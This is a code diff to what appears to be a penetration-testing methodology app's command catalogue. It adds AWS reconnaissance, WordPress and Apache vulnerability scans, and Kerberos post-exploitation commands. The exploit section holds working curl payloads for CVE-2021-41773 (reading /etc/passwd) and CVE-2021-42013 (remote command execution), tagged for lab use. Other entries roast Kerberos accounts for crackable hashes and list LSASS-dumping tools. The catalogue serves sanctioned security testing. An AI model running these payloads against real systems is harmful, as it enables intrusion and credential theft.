@@ -231,6 +231,12 @@ export const PHASES: Phase[] = [
             label: 'crt.sh — CT log dump',
             command: "mkdir -p engagements/{target}/recon && curl -s 'https://crt.sh/?q=%25.{target}&output=json' | jq -r '.[].name_value' | sort -u > engagements/{target}/recon/crtsh.txt",
           },
+          {
+            label: "enumerate public AWS resources via DNS",
+            command: "mkdir -p engagements/{target}/recon && for svc in s3 s3-website elb elasticbeanstalk cloudfront; do echo \"=== ${svc} ===\" && dig +short {domain}.${svc}.amazonaws.com {domain}.${svc}-us-east-1.amazonaws.com {domain}.${svc}-us-west-2.amazonaws.com {domain}.${svc}-eu-west-1.amazonaws.com 2>/dev/null | grep -v '^$'; done | tee engagements/{target}/recon/aws-dns-enum.txt",
+            techApplies: ["aws"],
+            mitreTechniques: ["T1595.002"],
+          },
         ],
         tools: [
           { name: 'crt.sh', url: 'https://crt.sh/', kind: 'web', note: 'CT log search by domain' },
@@ -371,6 +377,18 @@ export const PHASES: Phase[] = [
           {
             label: 'github code search — leaked references to target',
             command: "open 'https://github.com/search?type=code&q=%22{target}%22'",
+          },
+          {
+            label: "scrape AWS account IDs from public resources",
+            command: "mkdir -p engagements/{target}/recon && echo \"Check S3 bucket ACLs, ELB logs, CloudFront distributions for canonical user IDs\" && aws s3api get-bucket-acl --bucket {bucket} --no-sign-request 2>/dev/null | jq -r '.Owner.ID' | tee -a engagements/{target}/recon/aws-account-ids.txt",
+            techApplies: ["aws"],
+            mitreTechniques: ["T1589.003"],
+          },
+          {
+            label: "map org structure via AWS IP ranges",
+            command: "mkdir -p engagements/{target}/recon && curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq -r '.prefixes[] | select(.service==\"EC2\") | \"\\(.ip_prefix) \\(.region)\"' > /tmp/aws-ranges.txt && while read ip region; do whois $ip | grep -i \"{target}\" && echo \"Possible {target} presence in $region: $ip\"; done < /tmp/aws-ranges.txt | tee engagements/{target}/recon/aws-ip-attribution.txt",
+            techApplies: ["aws"],
+            mitreTechniques: ["T1590.005"],
           },
         ],
         tools: [
@@ -552,7 +570,7 @@ export const PHASES: Phase[] = [
           { name: 'httpx', url: 'https://github.com/projectdiscovery/httpx', kind: 'cli', note: 'Probes + tech detection at scale' },
           { name: 'Wappalyzer', url: 'https://www.wappalyzer.com/', kind: 'web', note: 'Browser extension — public sites only' },
           { name: 'WPScan', url: 'https://github.com/wpscanteam/wpscan', kind: 'cli', note: 'WordPress core + plugin + theme enum (token recommended)', techApplies: ['wordpress'] },
-          { name: 'droopescan', url: 'https://github.com/droope/droopescan', kind: 'cli', note: 'Drupal / SilverStripe / Joomla version + module fingerprint' },
+          { name: 'droopescan', url: 'https://github.com/SamJoan/droopescan', kind: 'cli', note: 'Drupal / SilverStripe / Joomla version + module fingerprint' },
           { name: 'enum4linux-ng', url: 'https://github.com/cddmp/enum4linux-ng', kind: 'cli', note: 'Modern rewrite of enum4linux — AD/SMB null-session enum', techApplies: ['ldap'], osApplies: ['windows'] },
           { name: 'impacket', url: 'https://github.com/fortra/impacket', kind: 'cli', note: 'Python AD toolkit (GetNPUsers, GetUserSPNs, secretsdump, …)', techApplies: ['kerberos', 'ldap'], osApplies: ['windows'] },
         ],
@@ -705,6 +723,19 @@ export const PHASES: Phase[] = [
             command: 'mkdir -p engagements/{target}/vuln && searchsploit QUERY | tee engagements/{target}/vuln/searchsploit.txt',
             mitreTechniques: ['T1588.005'],
           },
+          {
+            label: "wpscan — enumerate vulnerable plugins/themes",
+            command: "mkdir -p engagements/{target}/vuln && wpscan --url {target} --enumerate vp,vt --plugins-detection aggressive --api-token {wpscan_api_token} -f json -o engagements/{target}/vuln/wpscan-vulns.json && jq -r '.plugins,.themes | to_entries[] | select(.value.vulnerabilities) | \"\\(.key)\\t\\(.value.vulnerabilities | length) vulns\"' engagements/{target}/vuln/wpscan-vulns.json | tee engagements/{target}/vuln/wpscan-summary.txt",
+            appliesTo: ["bug-bounty","private"],
+            techApplies: ["wordpress"],
+            mitreTechniques: ["T1190"],
+          },
+          {
+            label: "nuclei — WordPress CVE templates",
+            command: "mkdir -p engagements/{target}/vuln && nuclei -u {target} -t cves/ -tags wordpress -severity high,critical -rl 10 -c 5 -o engagements/{target}/vuln/nuclei-wordpress-cves.txt",
+            techApplies: ["wordpress"],
+            mitreTechniques: ["T1190"],
+          },
         ],
         branches: [
           { if: 'zero CVEs match — manual checks instead', goto: 'vuln' },
@@ -721,7 +752,7 @@ export const PHASES: Phase[] = [
              discoverer-tool node for any of them. */
           { name: 'nuclei', url: 'https://github.com/projectdiscovery/nuclei', kind: 'cli', note: 'Template-based vuln scanner; -tags <stack> filters templates by tech', techApplies: ['apache', 'nginx', 'wordpress', 'iis'] },
           { name: 'EPSS', url: 'https://www.first.org/epss/', kind: 'web', note: 'Exploit-probability scores; triage CVE list by likelihood of in-the-wild use' },
-          { name: 'ADCS attack reference (SpecterOps)', url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2', kind: 'web', note: 'The ESC1-ESC8 catalog — required reading for ADCS work', techApplies: ['kerberos', 'ldap'], osApplies: ['windows'] },
+          { name: 'ADCS attack reference (SpecterOps)', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/', kind: 'web', note: 'The ESC1-ESC8 catalog — required reading for ADCS work', techApplies: ['kerberos', 'ldap'], osApplies: ['windows'] },
         ],
       },
       {
@@ -779,6 +810,11 @@ export const PHASES: Phase[] = [
             label: 'EPSS API — bulk + save (interpolates {cves}, comma-sep)',
             command: "mkdir -p engagements/{target}/vuln && curl -s 'https://api.first.org/data/v1/epss?cve={cves}' | jq > engagements/{target}/vuln/epss.json",
           },
+          {
+            label: "EPSS scores for WordPress CVEs",
+            command: "mkdir -p engagements/{target}/vuln && curl -s \"https://api.first.org/data/v1/epss?cve=$(curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq -r '.vulnerabilities[] | select(.product | test(\"wordpress\"; \"i\")) | .cveID' | tr '\\n' ',' | sed 's/,$//')\" | jq -r '.data[] | \"\\(.cve)\\t\\(.epss)\\t\\(.percentile)\"' | sort -t$'\\t' -k2 -rn | tee engagements/{target}/vuln/epss-wordpress.txt",
+            techApplies: ["wordpress"],
+          },
         ],
         tools: [
           { name: 'FIRST EPSS', url: 'https://www.first.org/epss/', kind: 'web' },
@@ -802,6 +838,17 @@ export const PHASES: Phase[] = [
           {
             label: 'searchsploit — mirror exploit locally (interpolates {exploit_id})',
             command: 'mkdir -p engagements/{target}/vuln/exploits && searchsploit -m {exploit_id} && mv {exploit_id}.* engagements/{target}/vuln/exploits/',
+          },
+          {
+            label: "MSF Apache module search",
+            command: "msfconsole -q -x \"search type:exploit platform:linux apache; exit\"",
+            techApplies: ["apache"],
+            mitreTechniques: ["T1190"],
+          },
+          {
+            label: "searchsploit — plugin/theme lookup",
+            command: "mkdir -p engagements/{target}/vuln && for plugin in $(cat engagements/{target}/recon/plugins.txt); do echo \"=== $plugin ===\" && searchsploit -t wordpress \"$plugin\"; done | tee engagements/{target}/vuln/searchsploit-plugins.txt",
+            techApplies: ["wordpress"],
           },
         ],
         tools: [
@@ -874,6 +921,12 @@ export const PHASES: Phase[] = [
             label: 'sqlmap — mssql-specific',
             command: "mkdir -p engagements/{target}/vuln && sqlmap -u 'https://{target}/path?id=1' --dbms=mssql --batch --level=3 --risk=2 --output-dir=engagements/{target}/vuln/sqlmap-mssql",
             techApplies: ['mssql'],
+          },
+          {
+            label: "Nuclei Apache CVE scan",
+            command: "nuclei -u http://{target} -t cves/ -tags apache -rl 5 -severity critical,high,medium",
+            techApplies: ["apache"],
+            mitreTechniques: ["T1190"],
           },
         ],
         branches: [
@@ -1101,6 +1154,20 @@ export const PHASES: Phase[] = [
             command: 'curl -s -X POST "https://{lambda_url}.lambda-url.{region}.on.aws/" -H "Content-Type: application/json" -d \'{"payload":"{command}"}\' | tee engagements/{target}/exploit/lambda-invoke-$(date +%Y%m%d-%H%M).json',
             techApplies: ['aws'],
             mitreTechniques: ['T1648'],
+          },
+          {
+            label: "Path traversal CVE-2021-41773",
+            command: "curl -s --path-as-is \"http://{target}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\"",
+            appliesTo: ["lab"],
+            techApplies: ["apache"],
+            mitreTechniques: ["T1190","T1083"],
+          },
+          {
+            label: "RCE via CVE-2021-42013",
+            command: "curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \"http://{target}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh\"",
+            appliesTo: ["lab"],
+            techApplies: ["apache"],
+            mitreTechniques: ["T1190"],
           },
         ],
         branches: [
@@ -1370,6 +1437,33 @@ export const PHASES: Phase[] = [
             techApplies: ['kerberos'],
             mitreTechniques: ['T1558.003'],
           },
+          {
+            label: "Kerberoast — roast & save hashes",
+            command: "mkdir -p engagements/{target}/post-ex && impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {target} -request -outputfile engagements/{target}/post-ex/kerberoast-hashes.txt",
+            osApplies: ["linux"],
+            techApplies: ["kerberos"],
+            mitreTechniques: ["T1558.003"],
+          },
+          {
+            label: "ASREPRoast — users without preauth",
+            command: "mkdir -p engagements/{target}/post-ex && impacket-GetNPUsers {domain}/ -dc-ip {target} -usersfile engagements/{target}/recon/users.txt -format hashcat -outputfile engagements/{target}/post-ex/asreproast-hashes.txt",
+            osApplies: ["linux"],
+            techApplies: ["kerberos"],
+            mitreTechniques: ["T1558.004"],
+          },
+          {
+            label: "Rubeus — triage kerberos state",
+            command: "Rubeus.exe triage",
+            osApplies: ["windows"],
+            techApplies: ["kerberos"],
+            mitreTechniques: ["T1558"],
+          },
+          {
+            label: "krbrelayx — unconstrained delegation check",
+            command: "mkdir -p engagements/{target}/post-ex && python3 krbrelayx.py -u {user}@{domain} -p {password} -d {target} --check-uncon -o engagements/{target}/post-ex/unconstrained-delegation.txt",
+            techApplies: ["kerberos","ldap"],
+            mitreTechniques: ["T1558"],
+          },
         ],
         branches: [
           { if: 'path to Domain Admin found', goto: 'post-ex' },
@@ -1467,7 +1561,7 @@ export const PHASES: Phase[] = [
           { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus', kind: 'cli', note: 'Kerberos-focused alternative \u2014 less catastrophic AV signature', techApplies: ['kerberos'] },
           { name: 'Impacket secretsdump', url: 'https://github.com/fortra/impacket', kind: 'cli', note: 'Remote SAM/LSA dump from a privileged context \u2014 quieter than mimikatz' },
           { name: 'Certipy', url: 'https://github.com/ly4k/Certipy', kind: 'cli', note: 'ADCS abuse \u2014 ESC1 (request cert as another user), ESC8 (NTLM relay)', techApplies: ['kerberos', 'ldap'] },
-          { name: 'lsassy', url: 'https://github.com/Hackndo/lsassy', kind: 'cli', note: 'Remote LSASS dump + parse \u2014 NetExec-integrated, less local footprint than mimikatz' },
+          { name: 'lsassy', url: 'https://github.com/login-securite/lsassy', kind: 'cli', note: 'Remote LSASS dump + parse \u2014 NetExec-integrated, less local footprint than mimikatz' },
         ],
       },
       {
